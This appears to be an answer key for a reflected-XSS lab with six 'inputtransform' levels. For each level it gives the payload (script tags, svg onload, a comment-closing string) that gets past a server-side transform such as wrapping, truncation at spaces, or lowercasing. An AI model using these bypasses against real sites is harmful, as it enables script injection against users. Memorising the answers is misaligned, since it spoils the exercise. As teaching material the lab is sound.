# inputtransform — solutions

Reflection after a server-side transform (prefix, tag wrap, split, reverse, lowercase). Pick a payload that survives.

### inputtransform-level1

`/inputtransform/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: prefix `User: ` then raw

### inputtransform-level2

`/inputtransform/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: wrapped in `<b>...</b>`; script still parses

### inputtransform-level3

`/inputtransform/level3/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>`
- context: truncated at first space — use `/` instead of space

### inputtransform-level4

`/inputtransform/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only first `&`-separated segment kept; no `&` needed

### inputtransform-level5

`/inputtransform/level5/?query=--%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `--><script>alert(1)</script>`
- context: original reflected inside HTML comment; close comment

### inputtransform-level6

`/inputtransform/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: lowercased — HTML is case-insensitive, payload already lowercase
